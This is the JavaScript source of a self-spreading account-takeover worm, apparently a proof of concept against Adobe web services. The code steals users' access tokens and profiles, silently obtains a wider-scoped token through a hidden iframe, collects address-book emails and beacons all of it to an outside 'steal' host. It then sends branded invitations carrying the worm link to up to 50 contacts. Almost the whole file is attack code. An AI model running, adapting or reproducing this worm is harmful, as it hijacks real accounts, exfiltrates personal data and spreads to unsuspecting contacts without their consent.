/**
 * Zero-Click ATO Worm — r00tdaddy
 * Confirmed 2026-06-05
 *
 * Two-stage self-propagating worm via chained Adobe vulnerabilities:
 *
 * STAGE 1 (this file, runs on www.adobe.com via maslibs XSS):
 *   - Exfiltrate IMS access_token (zero-click via prompt=none)
 *   - Exfiltrate full user profile (name, email)
 *   - Set x-asset-public-path cookie on .adobe.com → webpack hijack
 *   - Redirect to Express → triggers Stage 2
 *
 * STAGE 2 (runs on new.express.adobe.com via webpack chunk hijack):
 *   - Gets projectx_webapp token (has ab.manage scope)
 *   - Enumerate victim's address book contacts
 *   - Find/create a CC document URN
 *   - Send Adobe-branded invitation emails to all contacts
 *     with targetUrl = this maslibs worm URL
 *   - Victims click Adobe email → land on www.adobe.com → repeat
 */

const EXFIL    = 'https://nboyhu0n.instances.poc.jchunt.top/steal';
const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v8';
const AB_HOST  = 'https://ab.adobe-identity.com';
const INV_HOST = 'https://invitations.adobe.io';
const API_KEY_AB  = 'CCHomeWeb1';
const API_KEY_INV = 'projectx_webapp';

async function waitForIMS(maxMs = 8000) {
  const deadline = Date.now() + maxMs;
  while (Date.now() < deadline) {
    if (window.adobeIMS?.getAccessToken?.()) return window.adobeIMS.getAccessToken().token;
    await new Promise(r => setTimeout(r, 300));
  }
  return null;
}

function decodeJWT(token) {
  try {
    const parts = token.split('.');
    return JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
  } catch { return {}; }
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// STAGE 1: Runs on www.adobe.com (maslibs XSS)
// Token scope: adobedotcom-cc (AdobeID,openid,gnav,pps.read,firefly_api,...)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function stage1() {
  const token = await waitForIMS(8000);
  if (!token) return;

  const payload = decodeJWT(token);
  navigator.sendBeacon(`${EXFIL}?src=token&client=${payload.client_id}`, token);

  // Exfil full profile (name + email)
  try {
    const p = await fetch('https://ims-na1.adobelogin.com/ims/profile/v1?client_id=adobedotcom-cc', {
      headers: { 'Authorization': `Bearer ${token}` }
    }).then(r => r.json());
    navigator.sendBeacon(`${EXFIL}?src=profile`, JSON.stringify(p));
  } catch {}

  // If we already have ab.manage scope, run worm directly
  if (payload.scope?.includes('ab.manage')) {
    navigator.sendBeacon(`${EXFIL}?src=stage`, 'direct_worm_ab_manage');
    await wormSpread(token);
    return;
  }

  // Cross-client token theft: get CCHomeWeb1 token with ab.manage scope via hidden iframe
  // IMS accepts redirect_uri=https://www.adobe.com/ for CCHomeWeb1 → same-origin iframe → read token
  navigator.sendBeacon(`${EXFIL}?src=stage`, 'cross_client_iframe');
  try {
    const ccToken = await new Promise((resolve, reject) => {
      const iframe = document.createElement('iframe');
      iframe.style.cssText = 'position:absolute;width:0;height:0;border:0;opacity:0;pointer-events:none';
      const imsUrl = 'https://ims-na1.adobelogin.com/ims/authorize/v2'
        + '?client_id=CCHomeWeb1'
        + '&response_type=token'
        + '&prompt=none'
        + '&redirect_uri=' + encodeURIComponent('https://www.adobe.com/')
        + '&scope=AdobeID,ab.manage,creative_sdk,openid';
      iframe.src = imsUrl;
      const timeout = setTimeout(() => { reject('timeout'); }, 8000);
      iframe.onload = () => {
        try {
          const hash = iframe.contentWindow.location.hash;
          const match = hash.match(/access_token=([^&]+)/);
          if (match) {
            clearTimeout(timeout);
            resolve(decodeURIComponent(match[1]));
          } else {
            reject('no_token_in_hash');
          }
        } catch (e) {
          reject('cross_origin_' + e.message);
        }
      };
      document.body.appendChild(iframe);
    });

    const ccPayload = decodeJWT(ccToken);
    navigator.sendBeacon(`${EXFIL}?src=cc_token&client=${ccPayload.client_id}`, ccToken);
    await wormSpread(ccToken);
  } catch (e) {
    navigator.sendBeacon(`${EXFIL}?src=debug`, 'iframe_token_fail_' + e);
  }
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// STAGE 2 / WORM SPREAD: Requires token with ab.manage scope
// Enumerates contacts → creates/finds document → sends invitations
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function wormSpread(token) {
  // Phase A: Enumerate address book contacts
  let emails = [];
  try {
    const abResp = await fetch(`${AB_HOST}/api/address-books?limit=50`, {
      headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY_AB }
    });
    if (abResp.ok) {
      const abData = await abResp.json();
      const books = abData?._embedded?.addressBooks || [];
      for (const book of books) {
        const cResp = await fetch(
          `${AB_HOST}/api/address-books/${book.ident}/contacts?limit=100`,
          { headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY_AB } }
        );
        if (cResp.ok) {
          const contacts = await cResp.json().catch(() => ({}));
          const list = contacts?._embedded?.contacts || [];
          for (const c of list) {
            if (c?.email) emails.push(c.email);
          }
        }
      }
    }
  } catch {}

  navigator.sendBeacon(`${EXFIL}?src=contacts`, JSON.stringify(emails));
  if (!emails.length) {
    navigator.sendBeacon(`${EXFIL}?src=debug`, 'no_contacts_found');
    return;
  }

  // Phase B: Find or create a document URN for invitation sharing
  let urn = null;
  const urlMatch = window.location.href.match(/urn:aaid:sc:[A-Z0-9]+:[a-f0-9-]+/);
  if (urlMatch) urn = urlMatch[0];

  // Try page HTML
  if (!urn) {
    try {
      const html = document.documentElement.innerHTML;
      const urnMatch = html.match(/urn:aaid:sc:US:[a-f0-9-]+/);
      if (urnMatch) urn = urnMatch[0];
    } catch {}
  }

  // Try listing existing projects via ccprojects API
  if (!urn) {
    try {
      const listResp = await fetch('https://ccprojects.adobe.io/api/v3/projects?limit=1&orderBy=-modifyDate', {
        headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': 'projectx_webapp', 'Accept': 'application/hal+json' }
      });
      if (listResp.ok) {
        const listData = await listResp.json();
        const projects = listData?._embedded?.children || [];
        if (projects.length > 0) urn = projects[0]['repo:assetId'];
      }
    } catch {}
  }

  // Create a new project if none exist
  if (!urn) {
    try {
      const createResp = await fetch('https://ccprojects-va6.adobe.io/api/v3/projects/:create', {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': 'projectx_webapp', 'Content-Type': 'application/json', 'Accept': 'application/hal+json' },
        body: JSON.stringify({ 'repo:name': 'Untitled' })
      });
      if (createResp.ok) {
        const proj = await createResp.json();
        urn = proj['repo:assetId'];
      }
    } catch {}
  }

  if (!urn) {
    navigator.sendBeacon(`${EXFIL}?src=debug`, 'no_urn_found');
    return;
  }

  navigator.sendBeacon(`${EXFIL}?src=urn`, urn);

  // Phase C: Send Adobe-branded invitations to all contacts
  for (const email of emails.slice(0, 50)) {
    try {
      const invResp = await fetch(`${INV_HOST}/api/v4/share/${encodeURIComponent(urn)}?mode=direct_acl`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'X-Api-Key': API_KEY_INV,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          recipients: [{ recipient: `mailto:${email}`, role: 'editor', canComment: true, canShare: false }],
          notification: {
            email: { sharing: { locale: 'en-US', templateName: 'cc_collab_express_document_edit_invite_notification' } },
            parameters: { message: '', targetUrl: WORM_URL }
          },
          configuration: {}
        })
      });
      const result = await invResp.text().catch(() => '');
      navigator.sendBeacon(`${EXFIL}?src=inv&to=${encodeURIComponent(email)}`, result);
    } catch {}
  }

  navigator.sendBeacon(`${EXFIL}?src=worm_complete`, `sent_to_${emails.length}_contacts`);
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// ENTRY: Detect which stage we're in and execute
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
stage1();
